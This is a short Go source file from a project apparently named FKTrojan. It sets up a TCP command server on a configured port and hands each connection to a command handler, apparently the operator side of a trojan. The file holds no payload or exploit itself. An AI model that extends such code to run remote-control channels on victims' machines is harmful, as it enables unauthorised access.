package service_command

import (
	"FKTrojan/command_handler_server"
	"FKTrojan/config"
	"FKTrojan/connect"
	"io"
)

var (
	server *connect.TcpServer
)

func init() {

}

func ListenAndServe() error {
	server = connect.NewTcpServer(connect.COMMAND_SERVER, config.Conf.CmdPort, func(r io.Reader, w io.Writer) error {
		return ServerHandler(r, w, command_handler_server.ServerDo)
	})
	return server.Run()
}
